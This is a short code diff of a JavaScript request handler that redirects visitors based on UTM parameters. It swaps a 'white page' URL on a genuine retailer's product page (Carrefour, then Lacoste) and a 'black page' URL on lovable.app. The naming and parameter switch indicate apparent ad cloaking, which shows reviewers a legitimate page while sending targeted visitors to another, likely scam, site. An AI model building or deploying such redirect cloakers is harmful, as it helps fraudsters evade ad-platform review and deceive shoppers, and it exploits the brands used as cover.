@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.carrefourksa.com/mafsau/en/baby-soft-plush-toys/generic-marvel-spiderman-stuffed-soft-plush-toy/p/1259931000082?offer=offer_1250512599&sid=DEFAULT";
-    const blackPageURL = "https://luvcshap.lovable.app/";
+    const whitePageURL = "https://www.lacoste.ae/en/lacoste/men/clothing/t-shirts/french-made-stripe-neck-t-shirt/TH5455-00.html?dwvar_TH5455-00_color=132&dwvar_TH5455-00_size=3&quantity=1";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
